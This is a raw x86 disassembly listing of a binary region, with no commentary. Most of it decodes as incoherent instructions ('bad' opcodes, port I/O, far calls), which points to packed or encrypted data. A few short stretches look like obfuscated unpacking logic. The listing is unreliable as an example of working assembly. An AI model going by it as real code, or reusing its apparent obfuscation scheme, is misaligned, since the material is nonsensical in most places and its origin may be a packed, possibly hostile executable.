  403c64:	cmp    eax,0x7fa1a5b4
  403c69:	cmp    al,0x8a
  403c6b:	mov    al,ds:0xab8e57f1
  403c70:	or     dh,dh
  403c72:	xchg   eax,edi
  403c74:	jbe    0x403ce0
  403c76:	mov    ds:0x92b72d27,al
  403c7b:	mov    ds:0xada5b9b9,eax
  403c80:	cmp    edx,ebp
  403c82:	mov    edi,0x196e2168
  403c87:	cmp    BYTE PTR [edx+0x5d3e46a5],dh
  403c8d:	outs   dx,DWORD PTR ds:[esi]
  403c8e:	popa   
  403c8f:	mov    edi,DWORD PTR [ebx-0x2d]
  403c92:	mov    edx,0x697dcbfe
  403c97:	lock and DWORD PTR [ebp-0xa4e0c54],esi
  403c9e:	cld    
  403c9f:	dec    edi
  403ca0:	mov    WORD PTR [ecx+eax*2],?
  403ca3:	mov    cl,0xf
  403ca5:	addr16 jb 0x403c67
  403ca8:	imul   ebx,DWORD PTR ds:0xee2afe0f,0xffffff8b
  403caf:	repz loop 0x403cfb
  403cb2:	ja     0x403ce6
  403cb4:	xchg   DWORD PTR [ebp+ebx*4+0x58],ebp
  403cb8:	pushf  
  403cb9:	or     ebx,DWORD PTR [edx]
  403cbb:	adc    DWORD PTR [esi],ebp
  403cbd:	xchg   ecx,eax
  403cbe:	pushf  
  403cbf:	fidiv  DWORD PTR [ebx-0x7e]
  403cc2:	mov    WORD PTR [esi],ss
  403cc4:	out    dx,al
  403cc5:	(bad)  
  403cc6:	call   0x2043:0x46e49a19
  403ccd:	mov    al,0xd9
  403ccf:	lahf   
  403cd0:	pop    es
  403cd1:	push   eax
  403cd2:	xlat   BYTE PTR ds:[ebx]
  403cd3:	loop   0x403cd5
  403cd5:	jno    0x403c7f
  403cd7:	pop    esp
  403cd8:	sbb    cl,BYTE PTR [ecx+0x73cd7f7c]
  403cde:	mov    dh,0x4b
  403ce0:	add    DWORD PTR [edx],eax
  403ce2:	mov    ah,bl
  403ce4:	dec    edx
  403ce5:	pop    ebp
  403ce6:	pop    edi
  403ce7:	inc    ecx
  403ce8:	hlt    
  403ce9:	mov    esp,0x9041fb6e
  403cee:	call   0xa0ae7e3c
  403cf3:	inc    ecx
  403cf4:	jb     0x403d00
  403cf6:	sbb    DWORD PTR ds:0x185180dd,eax
  403cfc:	ret    
  403cfd:	fnstcw WORD PTR [ecx-0x18]
  403d00:	adc    BYTE PTR [ecx+0x58],0xa3
  403d04:	mov    al,ds:0xfce4839c
  403d09:	and    eax,0xb8e77eb7
  403d0e:	adc    eax,esi
  403d10:	mov    DWORD PTR [esi],esp
  403d12:	in     eax,dx
  403d13:	outs   dx,DWORD PTR ds:[esi]
  403d14:	loop   0x403ca5
  403d16:	out    0xb,al
  403d18:	mov    cl,0xd
  403d1a:	lds    edi,FWORD PTR [edx+edi*2]
  403d1d:	in     al,0xb
  403d1f:	(bad)  
  403d20:	push   0xd57e67ee
  403d25:	rcr    DWORD PTR [ecx-0x2a8202c7],cl
  403d2b:	jns    0x403ce9
  403d2d:	xor    cl,ch
  403d2f:	pop    ebx
  403d30:	imul   DWORD PTR [edx-0x7]
  403d33:	inc    edi
  403d34:	mov    ecx,0x81019717
  403d39:	pop    ebp
  403d3a:	push   ecx
  403d3b:	scas   eax,DWORD PTR es:[edi]
  403d3c:	loope  0x403cee
  403d3e:	pushf  
  403d3f:	scas   al,BYTE PTR es:[edi]
  403d40:	(bad)  
  403d41:	lock mov al,ds:0xb6a8e052
  403d47:	dec    esi
  403d49:	ss mov ecx,0x9163ea9c
  403d4f:	cs fmul st,st(5)
  403d52:	mul    BYTE PTR [ebp-0x76]
  403d55:	in     al,0x24
  403d57:	adc    esi,DWORD PTR [edi]
  403d59:	cmc    
  403d5a:	fst    st(4)
  403d5c:	push   0x41be8567
  403d61:	pop    edi
  403d62:	scas   eax,DWORD PTR es:[edi]
  403d63:	cmp    BYTE PTR [ecx+0xb],ch
  403d66:	mov    ch,0x72
  403d68:	or     esi,DWORD PTR [edi+0x17fff9cf]
  403d6e:	cmp    dh,bh
  403d70:	sub    esp,edi
  403d72:	aaa    
  403d73:	and    DWORD PTR [esi-0x4e],0x7775c820
  403d7a:	data16 test al,bl
  403d7d:	push   cs
  403d7e:	dec    ebp
  403d7f:	(bad)  
  403d80:	shl    BYTE PTR [edx+ebp*1-0x53],1
  403d84:	pop    ds
  403d85:	aas    
  403d86:	cli    
  403d87:	pop    ds
  403d88:	sbb    esp,0x48
  403d8b:	retf   
  403d8c:	repz jbe 0x403d25
  403d8f:	std    
  403d90:	bound  edi,QWORD PTR [ebx-0x5e01f705]
  403d96:	jp     0x403d6e
  403d98:	mov    WORD PTR [eax],cs
  403d9a:	dec    edi
  403d9b:	xchg   ebx,eax
  403d9c:	pop    esp
  403d9d:	aaa    
  403d9e:	mov    eax,ds:0x3c27f645
  403da3:	mov    ch,0xd5
  403da5:	push   ebx
  403da6:	and    BYTE PTR [edi+0x7c],bl
  403da9:	inc    ebx
  403daa:	fld    QWORD PTR [ebp-0x2657180c]
  403db0:	sub    bl,BYTE PTR [ecx+0x38f2802e]
  403db6:	out    dx,al
  403db7:	xor    cl,BYTE PTR [edx+0x32b3435b]
  403dbd:	xchg   WORD PTR [ecx+0x5d],ax
  403dc1:	jae    0x403dd4
  403dc3:	dec    edi
  403dc4:	xor    edx,eax
  403dc6:	inc    ebp
  403dc7:	cmp    BYTE PTR [esi+0x307e3b33],al
  403dcd:	or     BYTE PTR [edi-0x1abf0709],al
  403dd3:	sub    eax,0xd9960777
  403dd8:	lahf   
  403dd9:	pusha  
  403dda:	mov    esp,0xbb8c502d
  403ddf:	push   edx
  403de0:	mov    dl,0xbb
  403de2:	push   esi
  403de3:	or     eax,0xceb7666e
  403de8:	jbe    0x403e4c
  403dea:	mov    edi,0xa0eae31
  403def:	mov    ds:0xd0a861b4,al
  403df4:	sub    DWORD PTR [edx-0x7c],0xb3bf589b
  403dfb:	ss popf 
  403dfd:	jp     0x403dda
  403dff:	jmp    0x8a63d861
  403e04:	scas   al,BYTE PTR es:[edi]
  403e05:	dec    edx
  403e06:	or     ah,BYTE PTR [esi-0x132e2d55]
  403e0c:	cdq    
  403e0d:	cmp    DWORD PTR [ebx],0xc84477b0
  403e13:	dec    esp
  403e14:	push   0xffffffce
  403e16:	ja     0x403dcb
  403e18:	test   DWORD PTR [esi],esi
  403e1a:	jp     0x403e65
  403e1c:	data16 loop 0x403de7
  403e1f:	pop    esp
  403e20:	push   edx
  403e21:	xchg   edx,eax
  403e22:	and    al,0x95
  403e24:	inc    ecx
  403e25:	inc    esp
  403e26:	les    edi,FWORD PTR [ebp*1-0x401e95ed]
  403e2d:	idiv   DWORD PTR [edx]
  403e2f:	jns    0x403e48
  403e31:	in     eax,dx
  403e32:	xchg   edx,eax
  403e33:	mov    BYTE PTR [ecx],dl
  403e35:	clc    
  403e36:	mov    WORD PTR [eax],fs
  403e38:	mov    ebx,0x934dc146
  403e3d:	dec    esi
  403e3e:	arpl   WORD PTR [ebx+eiz*8-0x4c9d50e9],bx
  403e45:	hlt    
  403e46:	cs stos DWORD PTR es:[edi],eax
  403e48:	(bad)
  403e4c:	inc    ebx
  403e4d:	mov    edi,0x38fdf324
  403e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e53:	fcmovnb st,st(6)
  403e55:	and    BYTE PTR [ecx+0x70acc8da],ch
  403e5b:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e5d:	add    ebx,ebx
  403e5f:	fld    DWORD PTR [edx-0x33b2e30b]
  403e65:	and    al,0x1e
  403e67:	xor    ecx,DWORD PTR [eax-0x6c]
  403e6a:	lods   eax,DWORD PTR ds:[esi]
  403e6b:	jbe    0x403e98
  403e6d:	xor    eax,eax
  403e6f:	mov    dl,0x1b
  403e71:	cmp    BYTE PTR [ecx+eiz*8],0x7c
  403e75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e76:	stos   DWORD PTR es:[edi],eax
  403e77:	ficom  DWORD PTR [ebx]
  403e79:	sub    al,0xab
  403e7b:	xor    DWORD PTR [edx],edx
  403e7d:	aam    0x1d
  403e7f:	in     al,0x85
  403e81:	adc    BYTE PTR [esi+0x38],dl
  403e84:	loop   0x403f05
  403e86:	mov    BYTE PTR [ecx+ebx*2-0x35],dl
  403e8a:	dec    ebx
  403e8b:	push   edx
  403e8c:	push   ecx
  403e8d:	mov    BYTE PTR [esi+0x65],ah
  403e90:	adc    BYTE PTR [ecx],dl
  403e92:	jnp    0x403e29
  403e94:	jmp    0xea34c5be
  403e99:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e9b:	mov    ecx,0x2feb162f
  403ea0:	dec    eax
  403ea1:	and    eax,0x623fe32b
  403ea6:	bound  edi,QWORD PTR [eax-0x65]
  403ea9:	hlt    
  403eaa:	aad    0x3c
  403eac:	cwde   
  403ead:	mov    eax,0x93a4f400
  403eb2:	cdq    
  403eb3:	call   0x2788:0xf94652c0
  403eba:	fld    QWORD PTR [ebx]
  403ebc:	or     BYTE PTR [eax],0x5a
  403ebf:	bound  ebp,QWORD PTR [ebx]
  403ec1:	push   ebx
  403ec2:	clc    
  403ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ec4:	sub    DWORD PTR [edi+0x3398774b],eax
  403eca:	pop    ss
  403ecb:	mov    dl,0xf1
  403ecd:	pop    es
  403ece:	test   DWORD PTR [ebx+0x2f],esi
  403ed1:	inc    ebp
  403ed2:	jne    0x403e8f
  403ed4:	(bad)
  403ed7:	retf   0x3dc9
  403eda:	xchg   BYTE PTR [edi+0x151a7d28],ah
  403ee0:	jnp    0x403eec
  403ee2:	int3   
  403ee3:	arpl   WORD PTR [esi-0x46daac6c],ax
  403ee9:	int    0x77
  403eeb:	jp     0x403f25
  403eed:	popa   
  403eee:	aam    0xdc
  403ef0:	jmp    0x613a:0x4301eea2
  403ef7:	scas   al,BYTE PTR es:[edi]
  403ef8:	loop   0x403f54
  403efa:	iret   
  403efb:	test   dl,0x7b
  403efe:	or     eax,0xcd1d11ef
  403f03:	push   edi
  403f04:	rcl    BYTE PTR [ecx-0x4d],0x1e
  403f08:	mov    dl,0x8
  403f0a:	jecxz  0x403f0f
  403f0c:	add    DWORD PTR [ecx],ebx
  403f0e:	sbb    eax,0x42818f
  403f13:	mov    DWORD PTR [ebp-0x14],eax
  403f16:	mov    ecx,DWORD PTR [ebx]
  403f18:	mov    eax,DWORD PTR [ebx+0x4]
  403f1b:	mov    edx,DWORD PTR ds:0x42820f
  403f21:	mov    edx,DWORD PTR [edx]
  403f23:	add    DWORD PTR ds:0x42839b,edx
  403f29:	shrd   ecx,eax,0x2
  403f2d:	sub    edx,0x9bd
  403f33:	shr    eax,0x2
  403f36:	and    eax,eax
  403f38:	mov    eax,DWORD PTR [ebx]
  403f3a:	and    DWORD PTR ds:0x428257,0x5c10
  403f44:	jmp    0x404322
  403f49:	sub    DWORD PTR [ecx-0x65e52424],0xffffff82
  403f50:	and    esi,esi
  403f52:	sbb    BYTE PTR [ecx+0x7570c0bc],ch
  403f58:	jl     0x403f28
  403f5a:	xlat   BYTE PTR ds:[ebx]
  403f5b:	sbb    BYTE PTR [eax],bl
  403f5d:	sahf   
  403f5e:	adc    bl,BYTE PTR [eax]
  403f60:	sbb    bh,bl
  403f62:	cmp    BYTE PTR [edi-0x22],0x42
  403f66:	cmp    cl,BYTE PTR [esi]
  403f68:	pop    ebp
  403f69:	call   eax
  403f6b:	and    al,0x89
  403f6d:	repz mov cl,0xfd
  403f70:	add    ch,BYTE PTR [esi+0x77]
  403f73:	or     al,0xff
  403f75:	enter  0x9a7e,0x44
  403f79:	out    dx,al
  403f7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f7b:	inc    ebx
  403f7c:	popa   
  403f7d:	scas   eax,DWORD PTR es:[edi]
  403f7e:	mov    esp,0xe9c341ba
  403f83:	mov    DWORD PTR [ecx+0x5a],edx
  403f86:	lahf   
  403f87:	push   edi
  403f88:	sub    eax,0xddc7dde7
  403f8d:	test   DWORD PTR [ebx-0x7e03509f],edx
  403f93:	pushf  
  403f94:	ss sbb eax,0xc1568303
  403f9a:	stos   BYTE PTR es:[edi],al
  403f9b:	aam    0x98
  403f9d:	fsubr  QWORD PTR [ebp-0x78d7996b]
  403fa3:	in     al,0xea
  403fa5:	jo     0x404021
  403fa7:	xchg   edx,eax
  403fa8:	xor    bh,BYTE PTR [esi+0x77b97940]
  403fae:	fisttp WORD PTR [edi]
  403fb0:	add    eax,0x6db0daf0
  403fb5:	add    eax,0xfed5f7fe
  403fba:	ins    DWORD PTR es:[edi],dx
  403fbb:	add    BYTE PTR [edi+0x15],cl
  403fbe:	or     DWORD PTR [esi-0x2d],ebx
  403fc1:	sar    BYTE PTR [eax+0x2f],1
  403fc4:	jmp    0x403f6f
  403fc6:	aaa    
  403fc7:	mov    ch,0xe7
  403fc9:	jg     0x40400e
  403fcb:	and    DWORD PTR [ecx],ecx
  403fcd:	xchg   esi,esp
  403fcf:	add    BYTE PTR [edx],bl
  403fd1:	or     al,0x51
  403fd3:	fcompp 
  403fd5:	test   DWORD PTR [ebp+ebx*4+0x28d59a15],esp
  403fdc:	push   esi
  403fdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fde:	xchg   edx,eax
  403fdf:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  403fe1:	retf   
  403fe2:	and    ch,BYTE PTR [ecx-0x7934108c]
  403fe8:	push   ebp
  403fe9:	mov    ds:0x50e71c0,al
  403fee:	inc    edi
  403fef:	mov    esi,0x556f82b
  403ff4:	push   0x53
  403ff6:	xlat   BYTE PTR ds:[ebx]
  403ff7:	fs ss sbb eax,0x94a28108
  403ffe:	fadd   DWORD PTR [edi]
  404000:	add    DWORD PTR [ebp+0x1aad02e9],ecx
  404006:	(bad)  
  404007:	and    dh,ch
  404009:	sub    eax,0x6b753401
  40400e:	sbb    al,0x6d
  404010:	sbb    al,0x6a
  404012:	mov    edx,0xdeebd29d
  404017:	jae    0x403ffd
  404019:	mov    bh,0x12
  40401b:	mov    dl,0xaf
  40401d:	ss adc al,0xd
  404020:	mov    edx,0xa8da9b59
  404025:	sbb    bh,BYTE PTR [edi+ebp*8+0x37]
  404029:	js     0x40403d
  40402b:	mov    bh,0x54
  40402d:	mov    ch,0x5e
  40402f:	mov    es,WORD PTR [ebx+0x15281c23]
  404035:	sbb    eax,0x3a759b37
  40403a:	push   ecx
  40403b:	pop    ecx
  40403c:	(bad)  
  40403d:	stos   DWORD PTR es:[edi],eax
  40403e:	push   esp
  40403f:	pop    esp
  404040:	out    dx,eax
  404041:	sbb    bh,BYTE PTR [ecx-0x66b8ac4a]
  404047:	add    eax,DWORD PTR [esi]
  404049:	(bad)  
  40404a:	ja     0x4040ad
  40404c:	lds    esp,FWORD PTR [esi]
  40404e:	test   DWORD PTR [ebx-0x7d],ebx
  404051:	add    ecx,DWORD PTR [edx]
  404053:	sbb    ch,BYTE PTR [esi+ecx*2+0x521fed76]
  40405a:	hlt    
  40405b:	(bad)  
  40405c:	jg     0x40400d
  40405e:	pop    es
  40405f:	fsubp  st(5),st
  404061:	retf   
  404062:	outs   dx,DWORD PTR ds:[esi]
  404063:	lods   al,BYTE PTR ds:[esi]
  404064:	in     al,dx
  404065:	inc    ecx
  404066:	mov    DWORD PTR [ebp+0x5c],edi
  404069:	mov    ch,0xee
  40406b:	call   0xe9e3:0x2e328ab7
  404072:	cmp    dh,bh
  404074:	fidiv  WORD PTR [esi]
  404076:	dec    ecx
  404077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404078:	mov    eax,ds:0x86742f3c
  40407d:	pop    ss
  40407e:	or     cl,BYTE PTR [eax+edi*2-0x7a9e9478]
  404085:	cdq    
  404086:	in     eax,0x6c
  404088:	mov    ecx,0x9ac2fbaf
  40408d:	popf   
  40408e:	pop    ecx
  40408f:	sbb    ecx,0x33a15310
  404095:	push   esi
  404096:	cmp    eax,0xaf36c2cf
  40409b:	mov    ebp,0xa25e78dd
  4040a0:	aad    0xa0
  4040a2:	add    eax,0x760e80a5
  4040a7:	dec    ecx
  4040a8:	ins    DWORD PTR es:[edi],dx
  4040a9:	jns    0x404048
  4040ab:	sar    DWORD PTR [ebx+0x4b],1
  4040ae:	jg     0x4040a0
  4040b0:	in     al,0x6a
  4040b2:	retf   0xaf68
  4040b5:	xchg   ebx,eax
  4040b6:	dec    ebx
  4040b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040b8:	and    ecx,ebp
  4040ba:	jmp    0x404118
  4040bc:	fst    QWORD PTR [esi-0x6f95f0b3]
  4040c2:	mov    ebp,0x5113dde9
  4040c7:	fmul   QWORD PTR [ecx-0x3cbe6229]
  4040cd:	inc    eax
  4040ce:	jno    0x4040c3
  4040d0:	test   BYTE PTR [edi+0x48],bl
  4040d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040d4:	ds scas eax,DWORD PTR es:[edi]
  4040d6:	or     al,0x4
  4040d8:	xchg   edx,eax
  4040d9:	mov    esp,0xcf71350a
  4040de:	xchg   ecx,eax
  4040df:	mov    fs,WORD PTR [ebx]
  4040e1:	xor    BYTE PTR [esi-0x7664f915],ah
  4040e7:	imul   edx,DWORD PTR [esi-0x187d0f97],0xd165821a
  4040f1:	in     al,dx
  4040f2:	xchg   edi,eax
  4040f3:	push   edx
  4040f4:	cli    
  4040f5:	repnz mov ebx,0xc7ae0d77
  4040fb:	mov    edi,0x8745abab
  404100:	(bad)  
  404101:	sbb    ebp,DWORD PTR ds:0x500f0ee7
  404107:	adc    ah,BYTE PTR [ecx]
  404109:	mov    esp,0xeeee425d
  40410e:	imul   ecx,ecx,0xa9e31307
  404114:	push   esp
  404115:	hlt    
  404116:	sbb    DWORD PTR [eax+0x25e3044b],0xffffff8e
  40411d:	sbb    eax,0x1f3f4fa1
  404122:	push   edx
  404123:	mov    eax,0x82981800
  404128:	aad    0xa
  40412a:	paddq  mm0,QWORD PTR [ecx]
  40412d:	xchg   edi,eax
  40412e:	test   ebp,0x85ba41ba
  404134:	push   0xffffffdf
  404136:	xor    ax,0x3cd1
  40413a:	cmp    DWORD PTR [edx-0x1e],0x469c2152
  404141:	loopne 0x404125
  404143:	cs pop ds
  404145:	mov    ebp,edx
  404147:	mov    bl,0x92
  404149:	jp     0x40412c
  40414b:	retf   0x7157
  40414e:	mov    al,0x78
  404150:	out    dx,eax
  404151:	popa   
  404152:	xor    BYTE PTR [eax-0x4a],bl
  404155:	mov    al,ds:0x869b70fe
  40415a:	push   ds
  40415b:	add    eax,0x683992cb
  404160:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404161:	ja     0x40410c
  404163:	cdq    
  404164:	mov    al,0xd4
  404166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404167:	nop
  404168:	xor    BYTE PTR [esi+ebp*8-0x55bd4b51],ah
  40416f:	jl     0x4041c0
  404171:	loop   0x404154
  404173:	pushf  
  404174:	(bad)  
  404175:	out    dx,eax
  404176:	enter  0xdddd,0xf2
  40417a:	mov    ebx,0x1b0b21e6
  40417f:	jae    0x4041ac
  404181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404182:	cmp    BYTE PTR [edi-0x69],0x4c
  404186:	hlt    
  404187:	jp     0x404150
  404189:	jne    0x4041f7
  40418b:	fadd   DWORD PTR [ebx+0xb]
  40418e:	mov    al,0x32
  404190:	mov    esp,0x8eeedc79
  404195:	mov    al,0x13
  404197:	outs   dx,BYTE PTR ds:[esi]
  404198:	jle    0x40411d
  40419a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40419b:	cdq    
  40419c:	jmp    0x4041c0
  40419e:	push   eax
  40419f:	int    0x2
  4041a1:	loop   0x4041e4
  4041a3:	xor    eax,ebp
  4041a5:	jo     0x404137
  4041a7:	xor    bh,BYTE PTR [ecx+0x42]
  4041aa:	push   esi
  4041ab:	pop    ds
  4041ac:	add    eax,DWORD PTR [edi]
  4041ae:	(bad)  
  4041af:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041b1:	mov    bl,0x77
  4041b3:	xor    dh,BYTE PTR [ecx]
  4041b5:	popf   
  4041b6:	push   ebp
  4041b7:	lods   eax,DWORD PTR ds:[esi]
  4041b8:	push   0x62bbbc84
  4041bd:	sbb    edx,DWORD PTR [eax+eiz*2]
  4041c0:	cdq    
  4041c1:	xor    bh,ah
  4041c3:	sub    BYTE PTR [ebx],cl
  4041c5:	int3   
  4041c6:	mov    ch,0x25
  4041c8:	idiv   BYTE PTR [ecx+0xd]
  4041cb:	adc    DWORD PTR [ecx],edi
  4041cd:	mov    ecx,0xc3c4aac8
  4041d2:	mov    dl,0xd1
  4041d4:	inc    ecx
  4041d5:	loop   0x4041ce
  4041d7:	sub    eax,0xdde7a8d0
  4041dc:	and    eax,0xd740360d
  4041e1:	add    eax,DWORD PTR ds:0xe68d2d2e
  4041e7:	fld    QWORD PTR [eax+esi*4+0x79]
  4041eb:	jl     0x4041f8
  4041ed:	xchg   DWORD PTR [ecx-0x35],ebx
  4041f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041f1:	push   es
  4041f2:	imul   esi,DWORD PTR [ebp+0x4b],0xc70716e8
  4041f9:	inc    esi
  4041fa:	mov    edx,0xe9c47602
  4041ff:	pop    edx
  404200:	push   esi
  404201:	push   eax
  404202:	aas    
  404203:	cli    
  404204:	sbb    eax,0x2bc25c97
  404209:	pop    ebp
  40420a:	inc    ebx
  40420b:	daa    
  40420c:	fs clc 
  40420e:	add    eax,0x74ef47d4
  404213:	(bad)  
  404214:	into   
  404215:	xor    dl,BYTE PTR [edi-0x4385389]
  40421b:	xor    BYTE PTR [ebx],dl
  40421d:	pop    ds
  40421e:	dec    ebp
  40421f:	outs   dx,BYTE PTR ds:[esi]
  404220:	sahf   
  404221:	dec    eax
  404222:	outs   dx,DWORD PTR ds:[esi]
  404223:	xor    BYTE PTR [ebx],bl
  404225:	repnz nop
  404227:	mov    ebp,0xf0aa3519
  40422c:	repz test BYTE PTR [esi-0x7b7f80e3],cl
  404233:	adc    eax,0x29f24abd
  404238:	leave  
  404239:	and    cl,BYTE PTR [edi-0x33]
  40423c:	stos   BYTE PTR es:[edi],al
  40423d:	sar    DWORD PTR [edi+0x2a],0xa5
  404241:	adc    eax,0x97b99c65
  404246:	repz push cs
  404248:	in     al,0xe1
  40424a:	sub    bh,BYTE PTR [esi-0x7f]
  40424d:	sub    DWORD PTR ds:0x1082ad51,ebx
  404253:	sbb    DWORD PTR [ecx-0x3],esp
  404256:	cdq    
  404257:	enter  0xfa70,0x7e
  40425b:	ficom  WORD PTR [ecx]
  40425d:	icebp  
  40425e:	inc    ecx
  40425f:	lods   eax,DWORD PTR ds:[esi]
  404260:	and    eax,0x42217d56
  404265:	adc    ebp,DWORD PTR [edi-0x3d0738b7]
  40426b:	mov    esi,0x4ca6825b
  404270:	pop    ss
  404271:	push   edx
  404272:	mov    esp,0xabebbd4a
  404277:	add    edx,ebp
  404279:	dec    ebx
  40427a:	add    BYTE PTR [ecx+0x11],bl
  40427d:	jns    0x404278
  40427f:	js     0x4042e4
  404281:	mov    ds:0xf46edf49,eax
  404286:	dec    eax
  404287:	mov    WORD PTR fs:[eax],ds
  40428a:	in     eax,0x9
  40428c:	fstp   TBYTE PTR [esi-0x70cc624d]
  404292:	or     edi,esp
  404294:	out    dx,al
  404295:	or     DWORD PTR [edx-0x18a6baf9],esp
  40429b:	mov    ebp,edi
  40429d:	jg     0x4042c0
  40429f:	xor    al,ch
  4042a1:	xlat   BYTE PTR ds:[ebx]
  4042a2:	jns    0x404281
  4042a4:	jg     0x404273
  4042a6:	icebp  
  4042a7:	fidivr WORD PTR gs:[esi]
  4042aa:	ins    DWORD PTR es:[edi],dx
  4042ab:	mov    esp,0xe2c5e8d9
  4042b0:	pop    ss
  4042b1:	mov    ecx,0x44f80504
  4042b6:	inc    esp
  4042b7:	and    al,0xae
  4042b9:	cmp    dl,BYTE PTR [esi+0x5fcdebf8]
  4042bf:	inc    edx
  4042c0:	push   ebp
  4042c1:	inc    ecx
  4042c2:	jge    0x4042c0
  4042c4:	retf   0x5932
  4042c7:	pushf  
  4042c8:	test   BYTE PTR [ebx],cl
  4042ca:	iret   
  4042cb:	scas   eax,DWORD PTR es:[edi]
  4042cc:	aad    0xb6
  4042ce:	push   eax
  4042cf:	mov    ebx,0xb0956712
  4042d4:	lahf   
  4042d5:	xchg   ebx,eax
  4042d6:	xchg   ebp,esi
  4042d8:	pop    esp
  4042d9:	mov    dl,0x27
  4042db:	(bad)  
  4042dd:	das    
  4042de:	mov    DWORD PTR [esi+eax*4],eax
  4042e1:	jo     0x40433a
  4042e3:	pop    esi
  4042e4:	ins    DWORD PTR es:[edi],dx
  4042e5:	inc    ecx
  4042e6:	retf   0xe0a8
  4042e9:	dec    eax
  4042ea:	jbe    0x404279
  4042ec:	mov    dh,0xd6
  4042ee:	jbe    0x4042d0
  4042f0:	sub    eax,0x11661136
  4042f5:	xchg   ecx,eax
  4042f6:	sbb    eax,0x2c2e905f
  4042fb:	jmp    0x404306
  4042fd:	cmp    BYTE PTR [ebx],dl
  4042ff:	push   esp
  404300:	xlat   BYTE PTR ds:[ebx]
  404301:	jb     0x404377
  404303:	jo     0x4042e0
  404305:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404307:	cmp    ah,BYTE PTR [ebx]
  404309:	je     0x4042eb
  40430b:	ret    
  40430c:	out    dx,al
  40430d:	mov    ch,cl
  40430f:	mov    dh,BYTE PTR [edi]
  404311:	aad    0x3b
  404313:	mov    eax,0x107fc4a1
  404318:	xchg   esp,ebp
  40431a:	jne    0x4042ab
  40431c:	lock repnz sub eax,0x8b83ea9e
  404323:	push   ebx
  404324:	add    al,0x21
  404326:	sbb    eax,0x42825b
  40432b:	xor    ecx,edi
  40432d:	or     edx,DWORD PTR ds:0x42828b
  404333:	shl    eax,0x1e
  404336:	and    edx,DWORD PTR ds:0x428307
  40433c:	xor    eax,eax
  40433e:	mov    edx,DWORD PTR ds:0x428247
  404344:	and    DWORD PTR ds:0x4283a7,edx
  40434a:	or     eax,ecx
  40434c:	mov    ecx,DWORD PTR [ebx]
  40434e:	movzx  edx,BYTE PTR ds:0x42838f
  404355:	sbb    DWORD PTR ds:0x42829b,edx
  40435b:	mov    edx,DWORD PTR [ebx+0x4]
  40435e:	jmp    0x40473c
  404363:	xchg   BYTE PTR [eax+ebp*4],ch
  404366:	xchg   edx,eax
  404367:	call   0x1412:0x951c227a
  40436e:	stos   BYTE PTR es:[edi],al
  40436f:	cmp    eax,0x55aa1601
  404374:	iret   
  404375:	sbb    BYTE PTR [eax],bl
  404377:	sahf   
  404378:	adc    bl,BYTE PTR [eax]
  40437a:	sbb    al,dh
  40437c:	mov    edx,0xcbfb2918
  404381:	shl    DWORD PTR [esi+0x17],cl
  404384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404385:	jbe    0x404374
  404387:	stc    
  404388:	dec    esi
  404389:	mov    al,0x8c
  40438b:	push   es
  40438c:	dec    esp
  40438d:	je     0x40432d
  40438f:	mov    bh,BYTE PTR [ebp-0x6be29781]
  404395:	push   0x7010949d
  40439a:	add    eax,0x469c8da9
  40439f:	sub    esp,DWORD PTR [esp+eiz*8-0x41e27d19]
  4043a6:	inc    esp
  4043a7:	mov    dh,0xa2
  4043a9:	jae    0x4043c0
  4043ab:	je     0x4043ae
  4043ad:	jbe    0x4043f0
  4043af:	mov    dh,0xaf
  4043b1:	mov    eax,ds:0x9de26b90
  4043b6:	daa    
  4043b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043b8:	sbb    DWORD PTR [ebx],ecx
  4043ba:	or     eax,0x3e1c0740
  4043bf:	push   esp
  4043c0:	jecxz  0x40438b
  4043c2:	inc    ebp
  4043c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043c4:	mov    eax,0x6ccd50e5
  4043c9:	aas    
  4043ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043cb:	mov    ebx,0x5739a391
  4043d0:	call   0xe3cbda06
  4043d5:	adc    edi,DWORD PTR [ebx+0x48d17d0f]
  4043db:	dec    ebp
  4043dc:	dec    ebx
  4043dd:	aad    0xe1
  4043df:	outs   dx,DWORD PTR ds:[esi]
  4043e0:	les    esi,FWORD PTR [esi]
  4043e2:	pusha  
  4043e3:	add    ebx,DWORD PTR [eax]
  4043e5:	xchg   edx,eax
  4043e6:	adc    DWORD PTR [eax+0x16],ecx
  4043e9:	cdq    
  4043ea:	(bad)  
  4043eb:	mov    ch,0x5d
  4043ed:	sub    BYTE PTR [ebx*4-0x627d8639],dh
  4043f4:	sbb    eax,0x1454adf
  4043f9:	cmp    DWORD PTR [edx-0x34745891],eax
  4043ff:	mov    ?,WORD PTR ss:[eax+0xac738c8]
  404406:	movhps xmm2,QWORD PTR [esi+0x23c12198]
  40440d:	push   cs
  40440e:	sub    DWORD PTR [ebx],esi
  404410:	repnz pop edx
  404412:	(bad)  
  404413:	out    0x64,al
  404415:	adc    al,0x1b
  404417:	mov    DWORD PTR [ecx],edx
  404419:	push   edx
  40441a:	loope  0x404442
  40441c:	stos   BYTE PTR es:[edi],al
  40441d:	stc    
  40441e:	add    al,0x9c
  404420:	std    
  404421:	clc    
  404422:	cwde   
  404423:	or     dh,bh
  404425:	out    dx,eax
  404426:	sub    BYTE PTR [edi],ah
  404428:	cli    
  404429:	sahf   
  40442a:	in     eax,0x0
  40442c:	aas    
